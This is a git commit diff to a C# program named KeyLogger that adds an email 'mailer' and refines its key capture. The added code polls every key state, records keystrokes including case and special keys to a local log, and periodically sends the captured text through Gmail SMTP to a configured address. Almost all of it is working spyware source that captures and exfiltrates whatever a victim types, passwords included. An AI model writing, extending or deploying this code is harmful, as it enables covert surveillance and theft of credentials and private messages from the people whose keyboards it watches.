d262df1a3404c218d51510cb039bc9187e2c7220
DeinKaiser <evillive.yv@gmail.com>
2020-03-03 16:40:32 +0200

    Mailer added and logic updated

--- Program.cs
+++ Program.cs
@@ -6,6 +6,9 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Globalization;
+using System.Net;
+using System.Net.Mail;
 
 namespace KeyLogger
 {
@@ -17,24 +20,115 @@ namespace KeyLogger
         [STAThread]
         static void Main()
         {
-            string temp = "";
-            while (true)
+            MailAddress addressFrom = new MailAddress("your.keylogger.mail@gmail.com");
+            MailAddress addressTo = new MailAddress("to.mail@gmail.com");
+            string pass = "keyloger.mail.pass";
+            int lengthOfMails = 100;
+            var smtp = new SmtpClient
             {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(addressFrom.Address, pass)
+            };
+
+
+            string temp = "";
+            while (true)   
+            {   
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++)
-                {   
+                {
+                    bool shift = false;
+                    bool capslock = false;
                     int state = GetAsyncKeyState(i);
                     if (state != 0)
                     {
-                        temp += ((Keys)i).ToString();
-                        if (temp.Length > 10)
+                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.ShiftKey ||
+                            ((Keys)i) == Keys.Shift || ((Keys)i) == Keys.LShiftKey || ((Keys)i) == Keys.RShiftKey||
+                           ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.CapsLock) {continue;}
+                        if (((Keys)i) == Keys.Space)
                         {
-                            File.AppendAllText("keylogger.log", temp);
-                            temp = "";
+                            temp += " ";
+                            File.AppendAllText("keylogger.log", " ");
+                            continue;
                         }
+                        if (((Keys)i) == Keys.Enter)
+                        {
+                            temp += " [E]";
+                            File.AppendAllText("keylogger.log", " [E]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.Back)
+                        {
+                            temp += " \n[BS]";
+                            File.AppendAllText("keylogger.log", " [BS]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.Delete)
+                        {
+                            temp += " \n[Del]";
+                            File.AppendAllText("keylogger.log", " [Del]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.Control)
+                        {
+                            temp += " [Cntrl]";
+                            File.AppendAllText("keylogger.log", " [Cntrl]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.Menu)
+                        {
+                            temp += " [Alt]";
+                            File.AppendAllText("keylogger.log", " [Alt]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.Tab)
+                        {
+                            temp += " [Tab]";
+                            File.AppendAllText("keylogger.log", " [Tab]");
+                            continue;
+                        }
+                        if (((Keys)i) == Keys.Shift || ((Keys)i) == Keys.LShiftKey || ((Keys)i) == Keys.RShiftKey) { continue;}
+                        short shiftState = (short)GetAsyncKeyState(16);
+                        if ((shiftState & 0x8000) == 0x8000)
+                        {
+                            shift = true;
+                        }
+                        capslock = Console.CapsLock;
+                        if ((!shift && !capslock) || (shift && capslock))
+                        {
+                            temp += ((Keys)i).ToString().ToLower();
+                            File.AppendAllText("keylogger.log", ((Keys)i).ToString().ToLower());
+                        }
+                        else
+                        {
+                            temp += ((Keys)i).ToString().ToUpper();
+                            File.AppendAllText("keylogger.log", ((Keys)i).ToString().ToUpper());
+                        }
+                        
                     }
+                }
+
+                if (temp.Length > lengthOfMails)
+                {
+
+                    using (var message = new MailMessage(addressFrom, addressTo)
+                    {
+                        Subject = "KeyLogs",
+                        Body = temp
+                    })
+                    {
+                        smtp.Send(message);
+                    }
+
+                    temp = "";
                 }
             }
         }
     }
 }
+
+                                                                                        
